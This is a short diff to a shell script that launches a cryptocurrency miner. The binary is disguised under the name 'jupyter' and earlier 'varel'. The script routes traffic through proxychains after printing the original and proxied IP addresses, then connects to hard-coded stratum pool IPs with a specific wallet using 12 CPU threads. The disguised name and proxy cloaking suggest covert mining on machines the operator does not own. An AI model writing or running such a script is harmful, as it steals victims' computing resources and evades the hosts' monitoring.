@@ -1,4 +1,4 @@
-chmod +x varel proxy libproxychains4.so compile.sh
+chmod +x proxychains.conf jupyter proxy libproxychains4.so compile.sh
 echo "IP ORI ==> "$(curl ifconfig.me)
 echo "IP Baru ==> "$(./proxy curl ifconfig.me)
-./varel -a randomvirel --url 167.99.139.112:80 --user v3lozl43z0qi7q0l84z760i2k55uaqo92ucvv7jxxgz7klzc.ch19
+./jupyter --algorithm verushash --pool stratum+tcp://139.99.16.105:5040 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.CRO-19 --password x --cpu-threads 12
